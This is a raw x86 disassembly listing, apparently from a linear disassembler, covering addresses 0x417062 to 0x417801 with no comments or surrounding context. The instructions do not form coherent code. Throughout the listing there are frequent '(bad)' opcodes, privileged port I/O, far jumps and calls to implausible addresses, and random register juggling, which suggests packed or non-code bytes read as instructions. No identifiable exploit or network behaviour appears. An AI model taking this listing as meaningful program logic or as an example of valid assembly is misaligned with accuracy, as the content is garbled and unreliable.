  417062:	out    dx,al
  417063:	dec    ebx
  417064:	jno    0x4170bf
  417066:	ss dec eax
  417068:	push   ebx
  417069:	fwait
  41706a:	xor    esi,eax
  41706c:	push   es
  41706d:	sbb    ebx,ebp
  41706f:	inc    ebp
  417070:	push   edx
  417071:	test   al,0x1d
  417073:	das    
  417074:	arpl   ax,bp
  417076:	les    edi,FWORD PTR [eax+0x7e]
  417079:	loop   0x4170d7
  41707b:	jge    0x417018
  41707d:	xor    ch,BYTE PTR [edi+0x2f]
  417080:	arpl   si,cx
  417082:	popf   
  417083:	fist   DWORD PTR [ebp+0x433ba7a2]
  417089:	mov    ch,dl
  41708b:	std    
  41708c:	scas   eax,DWORD PTR es:[edi]
  41708d:	jnp    0x41710e
  41708f:	sub    bh,dh
  417091:	arpl   cx,bp
  417093:	scas   eax,DWORD PTR es:[edi]
  417094:	add    al,0xcd
  417096:	stos   BYTE PTR es:[edi],al
  417097:	loope  0x4170cc
  417099:	add    BYTE PTR [eax],cl
  41709b:	not    dl
  41709d:	push   0x5d73bc48
  4170a2:	test   BYTE PTR [ebp-0x29],al
  4170a5:	(bad)  [edx+0x7e]
  4170a8:	in     eax,0xd9
  4170aa:	mov    ds:0x52540a54,eax
  4170af:	jecxz  0x417083
  4170b1:	sbb    BYTE PTR [edx-0x6a5abdde],dl
  4170b7:	int3   
  4170b8:	mov    edx,0x31faa659
  4170bd:	in     eax,dx
  4170be:	pop    es
  4170bf:	inc    ebp
  4170c0:	fadd   QWORD PTR [eax+0x32daa400]
  4170c6:	mov    al,0x54
  4170c8:	cmp    DWORD PTR [eax+0x3ad59672],0xeab672b
  4170d2:	xchg   esp,eax
  4170d3:	xchg   ecx,eax
  4170d4:	(bad)  
  4170d5:	dec    edi
  4170d6:	dec    ecx
  4170d7:	test   ebx,edi
  4170d9:	push   es
  4170da:	mov    al,ds:0xb3740016
  4170df:	jno    0x4170df
  4170e1:	jp     0x4170e0
  4170e3:	mov    DWORD PTR [edx+esi*8-0x68],ebp
  4170e7:	and    BYTE PTR [edi+0x46],bh
  4170ea:	adc    eax,0x5463c1bd
  4170ef:	or     cl,BYTE PTR [ecx+0x757b534f]
  4170f5:	lods   al,BYTE PTR ds:[esi]
  4170f6:	sub    DWORD PTR [esi],ebx
  4170f8:	(bad)  
  4170f9:	out    dx,al
  4170fa:	enter  0x476b,0xf4
  4170fe:	mov    DWORD PTR [edx+0x8d60bf2],edi
  417104:	repz cmc 
  417106:	inc    esi
  417107:	sub    bl,BYTE PTR [edx+0x66]
  41710a:	pop    es
  41710b:	pop    esp
  41710c:	aaa    
  41710d:	mov    dh,0xd
  41710f:	jge    0x4170e1
  417111:	mov    cl,0xab
  417113:	push   ecx
  417114:	mov    ebp,0xf50390ed
  417119:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41711a:	std    
  41711b:	xchg   esi,eax
  41711c:	adc    eax,0x909fd787
  417121:	mov    ds:0xc0ec9154,al
  417126:	push   0x597541df
  41712b:	add    eax,0x81face5e
  417130:	dec    ebx
  417131:	fadd   DWORD PTR [ebp-0x4]
  417134:	jle    0x417103
  417136:	or     BYTE PTR [esi+0x4],bh
  417139:	scas   eax,DWORD PTR es:[edi]
  41713a:	jae    0x41717c
  41713c:	(bad)  
  41713d:	cmp    edi,DWORD PTR [ebx+eiz*2]
  417140:	jecxz  0x4171b1
  417142:	sbb    al,0x3a
  417144:	inc    eax
  417145:	dec    ebp
  417146:	cmp    BYTE PTR cs:[ebx],dh
  417149:	jecxz  0x417154
  41714b:	push   es
  41714c:	cmc    
  41714d:	outs   dx,DWORD PTR ds:[esi]
  41714e:	mov    bh,0xe3
  417150:	inc    esi
  417151:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417153:	or     eax,0xfb2e16c1
  417158:	add    eax,0x394e2691
  41715d:	outs   dx,BYTE PTR ds:[esi]
  41715e:	mov    ds:0x2ed54922,eax
  417163:	dec    esp
  417164:	and    al,0x8b
  417166:	mov    eax,ds:0x17f62f4
  41716b:	pop    edx
  41716c:	inc    ebx
  41716d:	out    dx,al
  41716e:	nop
  41716f:	sar    DWORD PTR [ebx-0x23b6d0cf],1
  417175:	xor    esi,edi
  417177:	imul   ecx,eax,0xa4b3ea7
  41717d:	clc    
  41717e:	out    dx,eax
  41717f:	and    ah,ah
  417181:	repnz sbb ebp,ebx
  417184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417185:	ret    
  417186:	push   cs
  417187:	and    DWORD PTR [edx-0x7d],ebp
  41718a:	pop    eax
  41718b:	ret    
  41718c:	inc    ebx
  41718d:	hlt    
  41718e:	aaa    
  41718f:	jbe    0x41717b
  417191:	cmp    dl,BYTE PTR [eax-0x32ea2de5]
  417197:	cld    
  417198:	mov    dh,0x0
  41719a:	xchg   edx,eax
  41719b:	or     al,0xf4
  41719d:	inc    edi
  41719e:	xchg   ecx,eax
  41719f:	xchg   ebx,eax
  4171a0:	cmp    bl,al
  4171a2:	or     BYTE PTR [eax+0x2],ch
  4171a5:	xor    DWORD PTR [edx-0x34],0x5b
  4171a9:	jg     0x41713f
  4171ab:	sbb    ch,0xa7
  4171ae:	add    al,0x5d
  4171b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171b1:	inc    edi
  4171b2:	clc    
  4171b3:	xor    BYTE PTR [ebp+0x4f],ch
  4171b6:	into   
  4171b7:	inc    ecx
  4171b8:	int3   
  4171b9:	pop    edi
  4171ba:	push   cs
  4171bb:	pop    edi
  4171bc:	xor    ch,BYTE PTR [ebx]
  4171be:	jmp    0x417211
  4171c0:	imul   esp,DWORD PTR [eax+ecx*4-0x7705192e],0x42c1b22a
  4171cb:	jp     0x4171fa
  4171cd:	frstor [ebp+eax*1+0x1c9aeb3c]
  4171d4:	loope  0x41722a
  4171d6:	das    
  4171d7:	inc    ebx
  4171d8:	mov    eax,0xae08c574
  4171dd:	jns    0x4171b5
  4171df:	jnp    0x417254
  4171e1:	xchg   esp,eax
  4171e2:	out    dx,al
  4171e3:	jo     0x417196
  4171e5:	aad    0x73
  4171e7:	add    edx,esp
  4171e9:	call   0x2bb64855
  4171ee:	mov    ?,WORD PTR [edi]
  4171f0:	add    ax,0x8894
  4171f4:	and    DWORD PTR [ebx-0x73991158],eax
  4171fa:	and    al,0xeb
  4171fc:	(bad)  
  4171fd:	(bad)  
  4171ff:	loope  0x417246
  417201:	sub    ecx,edx
  417203:	into   
  417204:	pop    edi
  417205:	add    eax,0xbb237f1f
  41720a:	sahf   
  41720b:	or     eax,0xcba6e525
  417210:	mov    ss,edi
  417212:	dec    eax
  417213:	sbb    ebx,DWORD PTR [esi+0x177b03bf]
  417219:	pop    edi
  41721a:	int3   
  41721b:	xchg   ecx,eax
  41721c:	ins    DWORD PTR es:[edi],dx
  41721d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41721e:	adc    al,0x47
  417220:	lea    esi,[ebp+0x6782284f]
  417226:	cli    
  417227:	sahf   
  417228:	out    dx,al
  417229:	mov    ebx,0x6e640dc3
  41722e:	ffreep st(0)
  417230:	sbb    BYTE PTR [esi-0x405f329b],bh
  417236:	push   cs
  417237:	popf   
  417238:	lea    ebx,[ebx]
  41723a:	sbb    edx,DWORD PTR [eax+0x786e8ec6]
  417240:	inc    ecx
  417241:	cli    
  417242:	mov    ebx,0x890c3824
  417247:	lock imul edi,DWORD PTR [esi-0x80],0x2ee19c35
  41724f:	cmp    DWORD PTR [edx],edi
  417251:	mov    al,0x45
  417253:	xchg   esp,eax
  417254:	xor    DWORD PTR [ecx-0x7],ebx
  417257:	repz loop 0x4172a3
  41725a:	dec    ecx
  41725b:	mov    edi,0xacd0a966
  417260:	jns    0x4171f1
  417262:	cli    
  417263:	xchg   edi,eax
  417264:	rcl    bl,cl
  417266:	cmp    eax,DWORD PTR [eax-0x10]
  417269:	xlat   BYTE PTR ds:[ebx]
  41726a:	loopne 0x417260
  41726c:	clc    
  41726d:	adc    ecx,DWORD PTR [esi-0x1462ef2]
  417273:	push   ecx
  417274:	cmp    ecx,edx
  417276:	aam    0x8d
  417278:	cmp    eax,0xc65480c0
  41727d:	xchg   esi,eax
  41727e:	dec    esp
  41727f:	sbb    al,0x16
  417281:	cld    
  417282:	jae    0x4172e2
  417284:	mov    WORD PTR [ebx+0x21],fs
  417287:	mov    ebp,0x9144f08
  41728c:	cdq    
  41728d:	cmp    eax,0x31a49e12
  417292:	data16 fcmovnu st,st(5)
  417295:	sub    edx,0x87e05d8c
  41729b:	out    0x8f,eax
  41729d:	outs   dx,BYTE PTR ds:[esi]
  41729e:	jns    0x4172a1
  4172a0:	pop    esp
  4172a1:	aaa    
  4172a2:	pop    esi
  4172a3:	ja     0x417301
  4172a5:	or     al,0x11
  4172a7:	gs out dx,eax
  4172a9:	jle    0x417318
  4172ab:	rcr    DWORD PTR [esi],1
  4172ad:	leave  
  4172ae:	ins    BYTE PTR es:[edi],dx
  4172af:	push   0x70
  4172b1:	xor    al,0x4c
  4172b3:	push   edx
  4172b4:	je     0x4172e9
  4172b6:	fidivr WORD PTR [edi+eax*1+0x50]
  4172ba:	bound  ebx,QWORD PTR [ebx+0x5a9001cd]
  4172c0:	je     0x4172c9
  4172c2:	sti    
  4172c3:	aad    0xe4
  4172c5:	leave  
  4172c6:	sub    bh,bl
  4172c8:	push   ss
  4172c9:	test   DWORD PTR [ecx+ebx*1],0xc3a6503b
  4172d0:	push   ds
  4172d1:	js     0x4172b0
  4172d3:	in     eax,0xc1
  4172d5:	inc    eax
  4172d6:	cmp    eax,0x74b66942
  4172db:	repnz pusha 
  4172dd:	mov    edx,0xce53b3a3
  4172e2:	int    0xad
  4172e4:	xor    eax,0xb1ffda9b
  4172e9:	mov    dl,0x84
  4172eb:	mov    BYTE PTR [ebp-0x5c],ah
  4172ee:	and    eax,0x46a38b10
  4172f3:	retf   0xb94f
  4172f6:	mov    edx,0x2c8db76b
  4172fb:	call   0x53ad6e02
  417300:	mov    ebp,0x367f8f44
  417305:	fwait
  417306:	jmp    0x417372
  417308:	inc    esi
  417309:	fisttp WORD PTR [edi]
  41730b:	mov    ch,0x96
  41730d:	pslld  mm3,QWORD PTR [ebp-0xa5debe3]
  417314:	mov    ebx,0xf7b51741
  417319:	dec    esi
  41731a:	into   
  41731b:	inc    esi
  41731c:	or     BYTE PTR [ebp+0x32a7306],bl
  417322:	and    ecx,DWORD PTR [eax]
  417324:	mov    ch,0xc1
  417326:	mov    ebx,DWORD PTR [edx]
  417328:	icebp  
  417329:	dec    edx
  41732a:	pop    ebx
  41732b:	je     0x4172f6
  41732d:	daa    
  41732e:	cmp    al,0x90
  417330:	mov    al,0xf1
  417332:	ins    DWORD PTR es:[edi],dx
  417333:	cli    
  417334:	push   cs
  417335:	scas   al,BYTE PTR es:[edi]
  417336:	pop    ebp
  417337:	dec    ecx
  417338:	in     eax,0xa7
  41733a:	or     al,0xa1
  41733c:	cmp    cl,BYTE PTR [edx-0x64]
  41733f:	inc    edi
  417340:	(bad)  
  417341:	out    0x67,eax
  417343:	jle    0x417393
  417345:	jb     0x4172e9
  417347:	fnstenv [edi+0x13bc37e6]
  41734d:	repz add BYTE PTR [ebx-0x330a1988],bl
  417354:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417355:	repz xor edx,esp
  417358:	fadd   DWORD PTR [esi]
  41735a:	addr16 sub al,0x14
  41735d:	test   DWORD PTR [esi],0x67d573b9
  417363:	add    ecx,esp
  417365:	inc    ebp
  417366:	lods   eax,DWORD PTR ds:[esi]
  417367:	jo     0x4173c1
  417369:	xchg   ebx,eax
  41736a:	mov    esi,DWORD PTR [ebx+0x5893734b]
  417370:	push   edi
  417371:	adc    eax,DWORD PTR [edi+0x56063d36]
  417377:	adc    ebp,DWORD PTR [esi]
  417379:	sti    
  41737a:	mov    DWORD PTR [esi-0x77cdac61],edx
  417380:	leave  
  417381:	push   cs
  417382:	hlt    
  417383:	xchg   edi,eax
  417384:	icebp  
  417385:	rcr    BYTE PTR [esi],cl
  417387:	xchg   edx,eax
  417388:	xchg   esp,eax
  417389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41738a:	and    al,0x71
  41738c:	jbe    0x417325
  41738e:	je     0x4173fe
  417390:	inc    eax
  417391:	adc    esp,DWORD PTR [ecx]
  417393:	pop    es
  417394:	ins    BYTE PTR es:[edi],dx
  417395:	dec    ebx
  417396:	sub    al,0x31
  417398:	iret   
  417399:	data16 cs ja 0x4173eb
  41739d:	ret    
  41739e:	push   edi
  41739f:	test   DWORD PTR [esp+esi*1-0x3e],0x68a8dc6e
  4173a7:	push   eax
  4173a8:	sar    DWORD PTR [ebx-0x59e0fe24],cl
  4173ae:	popf   
  4173af:	push   0xffffffe0
  4173b1:	jno    0x4173d5
  4173b3:	sub    eax,0x1231727a
  4173b8:	jb     0x41733c
  4173ba:	rol    DWORD PTR [ecx-0x13],cl
  4173bd:	ror    DWORD PTR [ecx],0xce
  4173c0:	mov    eax,0x5f3ec990
  4173c5:	mov    dh,dl
  4173c7:	in     al,0xe3
  4173c9:	adc    DWORD PTR [ebp-0x59],eax
  4173cc:	cdq    
  4173cd:	repnz test DWORD PTR [ebx-0x13100cdc],ebp
  4173d4:	into   
  4173d5:	out    0xd,al
  4173d7:	push   edx
  4173d8:	and    BYTE PTR [ecx+ecx*1-0x51f0f77],ah
  4173df:	push   cs
  4173e0:	or     cl,bl
  4173e2:	xor    BYTE PTR [ebp+esi*2+0x5bba7385],ah
  4173e9:	cmc    
  4173ea:	push   edx
  4173eb:	retf   
  4173ec:	sub    BYTE PTR [ebx-0x50],ch
  4173ef:	lahf   
  4173f0:	mov    al,0x64
  4173f2:	inc    eax
  4173f3:	fisub  DWORD PTR [ecx+0x42]
  4173f6:	jg     0x41738b
  4173f8:	adc    ch,BYTE PTR [edi+ecx*2+0x15]
  4173fc:	jmp    0x41739e
  4173fe:	xor    eax,0xc153367b
  417403:	mov    ecx,0x6492f6c6
  417408:	mov    ebp,esp
  41740a:	mov    dh,0x52
  41740c:	addr16 pop ebp
  41740e:	jbe    0x417473
  417410:	or     al,ah
  417412:	fdiv   QWORD PTR [ecx]
  417414:	scas   eax,DWORD PTR es:[edi]
  417415:	std    
  417416:	push   edx
  417417:	xchg   esp,eax
  417418:	push   ss
  417419:	or     ch,BYTE PTR [edx+0x7fa7e40]
  41741f:	pusha  
  417420:	adc    DWORD PTR [eax+0x30],ecx
  417423:	mov    bh,BYTE PTR [ebp-0x4ae3ab69]
  417429:	mov    bl,0xf3
  41742b:	xor    ah,BYTE PTR [eax]
  41742d:	cmp    ebx,ebx
  41742f:	inc    edx
  417430:	pop    ebx
  417431:	pop    edi
  417432:	mov    ds:0x9bc9b8b9,eax
  417437:	mov    eax,0x4472741e
  41743c:	push   ebp
  41743d:	fld    QWORD PTR ds:0x1b947a23
  417443:	jnp    0x417470
  417445:	or     ebx,0xffffff9e
  417448:	stos   BYTE PTR es:[edi],al
  417449:	push   es
  41744a:	adc    ecx,edi
  41744c:	push   es
  41744d:	mov    bh,0xfe
  41744f:	jnp    0x417487
  417451:	data16 mov cl,0xc4
  417454:	and    eax,0xb6b44f4a
  417459:	sub    edi,DWORD PTR [edi-0x5c]
  41745c:	push   ss
  41745d:	mov    edx,0x943b8328
  417462:	jp     0x4173e8
  417464:	jge    0x417476
  417466:	cmp    ebp,ecx
  417468:	shl    DWORD PTR [ecx+0x66],cl
  41746b:	inc    eax
  41746c:	ret    0xa147
  41746f:	sbb    eax,eax
  417471:	sar    eax,1
  417473:	aad    0x5e
  417475:	mov    ?,WORD PTR [eax]
  417477:	xchg   esi,eax
  417478:	mov    bh,0x65
  41747a:	inc    esi
  41747b:	std    
  41747c:	add    esp,ecx
  41747e:	add    edx,DWORD PTR [ecx]
  417480:	sbb    DWORD PTR [ecx+esi*1-0x44],0xffffffff
  417485:	adc    al,0xf6
  417487:	sbb    ebp,0x4a
  41748a:	rcr    DWORD PTR [edx-0x40],1
  41748d:	das    
  41748e:	add    BYTE PTR [edx-0x527f2bad],bl
  417494:	sub    eax,0xfbacdbdf
  417499:	les    esp,FWORD PTR [eax-0x3e]
  41749c:	lods   al,BYTE PTR ds:[esi]
  41749d:	test   BYTE PTR [edi],ch
  41749f:	test   BYTE PTR [edi+0x50],bh
  4174a2:	mov    bl,BYTE PTR [edx]
  4174a4:	xor    DWORD PTR [ecx],edi
  4174a6:	dec    ebp
  4174a7:	mov    eax,ds:0xe351b084
  4174ac:	hlt    
  4174ad:	add    DWORD PTR [esi-0x53],esi
  4174b0:	pop    es
  4174b1:	pusha  
  4174b2:	mov    dh,0x7c
  4174b4:	gs popf 
  4174b6:	pop    ebp
  4174b7:	xlat   BYTE PTR ds:[ebx]
  4174b8:	pop    esi
  4174b9:	add    eax,0x63a80994
  4174be:	ret    
  4174bf:	aaa    
  4174c0:	inc    ebp
  4174c1:	and    ebp,DWORD PTR [ecx]
  4174c3:	scas   al,BYTE PTR es:[edi]
  4174c4:	lock shl DWORD PTR [eax+ebx*8],1
  4174c8:	lds    ebx,FWORD PTR [ebp+0x39]
  4174cb:	enter  0x6560,0xbe
  4174cf:	add    eax,0xf7dc67b7
  4174d4:	call   0x2a79c32d
  4174d9:	call   0x850f83ae
  4174de:	repz inc ecx
  4174e0:	cli    
  4174e1:	inc    edi
  4174e2:	sbb    bl,BYTE PTR [esi-0x59]
  4174e5:	add    cl,bh
  4174e7:	popa   
  4174e8:	bound  edi,QWORD PTR [edi+0xb]
  4174eb:	int3   
  4174ec:	xor    BYTE PTR [eax],ch
  4174ee:	cmp    DWORD PTR [esp+edi*1+0x722261ca],esi
  4174f5:	jmp    esi
  4174f7:	sar    BYTE PTR [ecx-0x12e30650],1
  4174fd:	es pop ebx
  4174ff:	and    BYTE PTR [esi],al
  417501:	sar    DWORD PTR [edx+0x63],cl
  417504:	cs out 0xeb,al
  417507:	jmp    0x6ac9:0x129606d3
  41750e:	mov    BYTE PTR [ebx-0x448dc1ba],al
  417514:	out    dx,al
  417515:	das    
  417516:	rol    BYTE PTR [edx+esi*1-0x5c989c9f],cl
  41751d:	pop    ebp
  41751e:	sub    al,0xb3
  417520:	push   es
  417521:	mov    ecx,DWORD PTR [edi+0x7d071246]
  417527:	and    DWORD PTR [ebp+0x13],esp
  41752a:	or     DWORD PTR [ebx],0xffffff93
  41752d:	popf   
  41752e:	and    bl,BYTE PTR [ebx+edx*2]
  417531:	hlt    
  417532:	cdq    
  417533:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417534:	add    ch,bh
  417536:	sbb    al,0x8
  417538:	fsub   QWORD PTR [ecx+0x27df5870]
  41753e:	repnz push ds
  417540:	inc    ecx
  417541:	mov    dh,0xfb
  417543:	nop
  417544:	shr    DWORD PTR ds:0xe1541ba9,1
  41754a:	out    0x1d,eax
  41754c:	fwait
  41754d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754e:	push   edi
  41754f:	pop    esi
  417550:	sub    ebp,ecx
  417552:	push   ecx
  417553:	sub    al,0xd3
  417555:	loop   0x417598
  417557:	xlat   BYTE PTR ds:[ebx]
  417558:	adc    ecx,DWORD PTR [edi]
  41755a:	cli    
  41755b:	add    al,0xc
  41755d:	pop    ebx
  41755e:	out    dx,al
  41755f:	mov    al,0x45
  417561:	fdiv   QWORD PTR [eax-0x62]
  417564:	sbb    dl,dh
  417566:	adc    BYTE PTR [ecx-0x1f24d6b2],ch
  41756c:	jge    0x4175c9
  41756e:	inc    ecx
  41756f:	ins    DWORD PTR es:[edi],dx
  417570:	out    0x7d,al
  417572:	push   esi
  417573:	sbb    eax,0x44d15bbf
  417578:	and    DWORD PTR [edx],0x49
  41757b:	fidiv  WORD PTR [edi-0x7a86a4ba]
  417581:	ins    DWORD PTR es:[edi],dx
  417582:	pop    eax
  417583:	in     eax,dx
  417584:	jp     0x4175bd
  417586:	xchg   DWORD PTR [eax+0x7272eac4],esi
  41758c:	test   al,0x9c
  41758e:	pop    esi
  41758f:	jecxz  0x4175ce
  417591:	and    eax,0xac99ae8f
  417596:	lods   eax,DWORD PTR ds:[esi]
  417597:	add    DWORD PTR [ebp+0x6ad3d802],esp
  41759d:	jmp    0x316:0x6d591546
  4175a4:	xchg   edx,eax
  4175a5:	cld    
  4175a6:	push   ebx
  4175a7:	sahf   
  4175a8:	pop    edx
  4175a9:	push   ebx
  4175aa:	and    ebx,ebx
  4175ac:	pop    ss
  4175ad:	(bad)  
  4175ae:	addr16 jg 0x417623
  4175b1:	test   DWORD PTR [eax-0x2f],ebp
  4175b4:	leave  
  4175b5:	fld    QWORD PTR [ebx]
  4175b7:	and    al,0x12
  4175b9:	mov    ecx,0xc7936bd0
  4175be:	(bad)  
  4175bf:	int    0x26
  4175c1:	push   ebp
  4175c2:	push   eax
  4175c3:	push   esi
  4175c4:	ja     0x4175bf
  4175c6:	adc    eax,0xb7ecb163
  4175cb:	fimul  DWORD PTR ds:0x5d30311b
  4175d1:	ins    BYTE PTR es:[edi],dx
  4175d2:	sti    
  4175d3:	cmp    eax,0x2114bc68
  4175d8:	add    cl,BYTE PTR gs:[ebx]
  4175db:	sbb    bh,BYTE PTR ds:0x4f451fa4
  4175e1:	outs   dx,DWORD PTR ds:[esi]
  4175e2:	retf   0xaded
  4175e5:	xchg   edx,eax
  4175e6:	iret   
  4175e7:	xchg   esp,eax
  4175e8:	mov    ds:0xd3fab27e,eax
  4175ed:	fld    TBYTE PTR [edx+0x32]
  4175f0:	out    dx,eax
  4175f1:	fwait
  4175f2:	je     0x417660
  4175f4:	xchg   esp,eax
  4175f5:	outs   dx,BYTE PTR ds:[esi]
  4175f6:	test   al,0x6c
  4175f8:	dec    esp
  4175f9:	dec    esi
  4175fa:	pop    esi
  4175fb:	xlat   BYTE PTR ds:[ebx]
  4175fc:	loope  0x4175dc
  4175fe:	mov    ebp,0xd5d345db
  417603:	fcom   DWORD PTR [eax+0x73]
  417606:	cmp    esp,eax
  417608:	mov    esi,0x5989c40
  41760d:	in     eax,0x57
  41760f:	xchg   ebx,eax
  417610:	adc    eax,esp
  417612:	mov    al,fs:0x5f966c79
  417618:	(bad)  
  417619:	in     al,0x45
  41761b:	mov    ds:0xcaa681c2,al
  417620:	ror    ebx,1
  417622:	mov    eax,ds:0x1f09c9b1
  417627:	(bad)  
  417628:	(bad)  
  41762a:	or     ebx,ecx
  41762c:	pop    ebx
  41762d:	sbb    ebp,ebx
  41762f:	push   eax
  417630:	(bad)  
  417631:	mov    ecx,0x9fa910e3
  417636:	jno    0x417680
  417638:	jno    0x417695
  41763a:	bound  ebp,QWORD PTR [ecx]
  41763c:	push   ecx
  41763d:	pop    eax
  41763e:	mov    cl,0xf1
  417640:	aad    0xa7
  417642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417643:	sub    BYTE PTR [ecx+ecx*1+0x77],ch
  417647:	xchg   ecx,eax
  417648:	lds    ebp,FWORD PTR [ebx+0x1f135474]
  41764e:	pop    eax
  41764f:	mov    ch,0x6a
  417651:	and    BYTE PTR [esi-0x3d],bl
  417654:	(bad)  
  417655:	cmp    esi,DWORD PTR [eax-0x1b0e7bd7]
  41765b:	in     eax,dx
  41765c:	outs   dx,BYTE PTR ds:[esi]
  41765d:	lods   al,BYTE PTR ds:[esi]
  41765e:	xor    DWORD PTR [esi+0x1c],esp
  417661:	stos   BYTE PTR es:[edi],al
  417662:	imul   DWORD PTR [ebx+eiz*1+0x128f0fac]
  417669:	icebp  
  41766a:	push   eax
  41766b:	in     al,dx
  41766c:	fldcw  WORD PTR [esi+0x7af095c]
  417672:	jge    0x41760a
  417674:	les    esi,FWORD PTR [eax+0x3a]
  417677:	das    
  417678:	sub    BYTE PTR [edi+0x30],dh
  41767b:	sbb    eax,0xb7e93660
  417680:	add    edi,DWORD PTR [eax]
  417682:	xlat   BYTE PTR ds:[ebx]
  417683:	in     al,dx
  417684:	add    DWORD PTR [ebx+0x22],esi
  417687:	xchg   esi,eax
  417688:	fild   DWORD PTR [eax-0x1f]
  41768b:	std    
  41768c:	in     eax,dx
  41768d:	pop    eax
  41768e:	xchg   DWORD PTR [esi+0x20],esi
  417691:	test   DWORD PTR [ecx],eax
  417693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417694:	lahf   
  417695:	jno    0x4176b1
  417697:	xor    eax,0x9f42c462
  41769c:	dec    eax
  41769d:	jp     0x417669
  41769f:	leave  
  4176a0:	mov    BYTE PTR [ecx-0x643d963a],0x87
  4176a7:	jne    0x4176ca
  4176a9:	dec    esp
  4176aa:	test   eax,0xa1cd1700
  4176af:	pop    ebx
  4176b0:	into   
  4176b1:	xchg   ebp,eax
  4176b2:	popf   
  4176b3:	sbb    dh,BYTE PTR [edx]
  4176b5:	dec    ebp
  4176b6:	mov    BYTE PTR [ebx+edx*4-0x8],al
  4176ba:	data16 xor al,0x73
  4176bd:	cmp    DWORD PTR [ebp-0x1a734dc7],ebp
  4176c3:	xchg   edx,eax
  4176c4:	mov    ecx,0x4a9ce681
  4176ca:	push   esi
  4176cb:	or     al,0x70
  4176cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176ce:	jnp    0x41771d
  4176d0:	xchg   edi,eax
  4176d1:	sar    eax,0xcf
  4176d4:	call   0x69de:0x31922abf
  4176db:	mov    eax,ds:0x953aba50
  4176e0:	adc    ecx,DWORD PTR [edx]
  4176e2:	and    eax,0x75f57d2f
  4176e7:	xchg   ecx,eax
  4176e8:	(bad)
  4176eb:	jmp    0x3cc1992d
  4176f0:	ret    
  4176f1:	cld    
  4176f2:	loop   0x41776c
  4176f4:	data16 xor dl,BYTE PTR [ecx-0xa8e8105]
  4176fb:	cmp    ch,BYTE PTR [eax]
  4176fd:	mov    bl,0x2d
  4176ff:	add    bh,BYTE PTR [eax+0x6]
  417702:	add    BYTE PTR [ecx+0x3e873f3f],cl
  417708:	xchg   edi,eax
  417709:	or     DWORD PTR [edx-0x1455388e],edi
  41770f:	stc    
  417710:	arpl   si,bx
  417712:	add    BYTE PTR [ebp-0x56],cl
  417715:	cmp    ebp,DWORD PTR [edi]
  417717:	retf   
  417718:	bound  edx,QWORD PTR [edx-0x38]
  41771b:	lock out dx,al
  41771d:	fwait
  41771e:	push   eax
  41771f:	jp     0x417754
  417721:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417722:	out    0xe7,eax
  417724:	adc    eax,0x230968f0
  417729:	cli    
  41772a:	cmc    
  41772b:	test   BYTE PTR [esi+ebp*4-0x31],ah
  41772f:	ds (bad) 
  417732:	cld    
  417733:	arpl   WORD PTR [eax+0x19],bp
  417736:	or     eax,0x520002e0
  41773b:	mov    ebp,0xd98c3497
  417740:	jne    0x4177a0
  417742:	xchg   BYTE PTR [eax+eiz*8+0x149bf758],al
  417749:	popa   
  41774a:	dec    esp
  41774b:	sbb    edi,0x5bb77600
  417751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417752:	outs   dx,BYTE PTR ds:[esi]
  417753:	scas   al,BYTE PTR es:[edi]
  417754:	inc    ecx
  417755:	jecxz  0x4177b3
  417757:	(bad)  
  417758:	and    ecx,DWORD PTR [eax-0x6deb6811]
  41775e:	lock fdiv st(1),st
  417761:	mov    dl,0x4c
  417763:	push   ebx
  417764:	add    eax,0x72d2a274
  417769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41776a:	jl     0x4177ba
  41776c:	mov    al,0x73
  41776e:	(bad)  
  41776f:	push   esp
  417770:	stos   DWORD PTR es:[edi],eax
  417771:	in     eax,0x81
  417773:	adc    eax,0xfdad6e0d
  417778:	inc    esi
  417779:	jg     0x41772c
  41777b:	lods   eax,DWORD PTR ds:[esi]
  41777c:	fs cli 
  41777e:	inc    edi
  41777f:	mov    ebx,0x9a5f6b9a
  417784:	and    ebx,DWORD PTR [ecx-0x55b26678]
  41778a:	(bad)  
  41778b:	repnz rcl DWORD PTR [ebx+0x78baa5a0],0x53
  417793:	dec    esi
  417794:	mov    edi,0xc2e6762a
  417799:	xchg   ecx,eax
  41779a:	xlat   BYTE PTR ds:[ebx]
  41779b:	push   edi
  41779c:	repz test BYTE PTR [edi-0x46b19015],cl
  4177a3:	jmp    0x78ec1a94
  4177a8:	pusha  
  4177a9:	cld    
  4177aa:	out    0x4,eax
  4177ac:	(bad)  
  4177ad:	inc    BYTE PTR [esi-0x775cf5ab]
  4177b3:	inc    ebx
  4177b4:	popa   
  4177b5:	out    dx,eax
  4177b6:	mov    edi,0x2d4e4f36
  4177bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177bc:	sub    eax,0xaeae0cea
  4177c1:	mov    ah,0xd0
  4177c3:	cld    
  4177c4:	arpl   WORD PTR ds:0x5392c709,bx
  4177ca:	jmp    0x4177fd
  4177cc:	cmp    DWORD PTR [edx],ebx
  4177ce:	mov    ecx,0x5b559129
  4177d3:	imul   ebx,DWORD PTR [eax-0x73441b54],0x7f
  4177da:	or     cl,BYTE PTR [eax+esi*8+0x76]
  4177de:	and    eax,0x7eeb5c77
  4177e3:	cs (bad) 
  4177e6:	xor    eax,0x9e1e1884
  4177eb:	das    
  4177ec:	aad    0xf
  4177ee:	jmp    DWORD PTR [ecx]
  4177f0:	cs test al,0x6f
  4177f3:	pop    es
  4177f4:	adc    dl,bh
  4177f6:	cmc    
  4177f7:	lods   eax,DWORD PTR ds:[esi]
  4177f8:	fst    DWORD PTR [edi-0x79]
  4177fb:	mov    ah,BYTE PTR [eax+0x36]
  4177fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177ff:	(bad)  
  417800:	in     al,dx
  417801:	test   BYTE PTR [ecx+0x2c],ah
